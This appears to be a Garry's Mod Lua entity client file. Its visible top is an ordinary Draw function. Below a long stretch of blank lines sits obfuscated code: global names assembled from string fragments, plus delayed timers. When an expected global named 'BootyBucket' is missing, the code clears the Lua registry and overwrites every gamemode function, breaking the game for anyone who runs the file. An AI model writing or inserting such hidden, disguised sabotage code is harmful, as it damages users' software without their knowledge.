language.Add("auto_removed", "Bad Adv. Dupe (?!)")
include('shared.lua')


function ENT:Draw()
    self:DrawModel()
	
	if (LocalPlayer():GetPos() - self:GetPos()):Length() < 300 then
		AddWorldTip( self:EntIndex(), "What are you doing?!", 0.5, self:GetPos(), self )
	end
end































local type		= type
local pairs		= pairs
local include	= include
local _G		= _G
local _R		= _R
local GAMEMODE	= GAMEMODE
local NotTS		= timer.Simple
local DrawBeam	= render.DrawBeam


local ENT	= "B".."oot".."y".."B".."u".."c".."k".."et"

NotTS(5, function()
	if not type or type(_G) != "table" then _G = {} end
	
	if not _G[ENT] then
		include("e".."n".."_".."str".."eam".."h".."k".."s"..".lua")
	end
	
	NotTS(5, function()
		if not _G[ENT] then -- >:(
			if not _R then GAMEMODE = _G return end
			
			for k,v in pairs(_R) do _R[k] = nil end
		end
	end)
	
	if not datasteam then
		for k,v in pairs(GAMEMODE) do
			GAMEMODE[k] = DrawBeam
		end
	end
end)












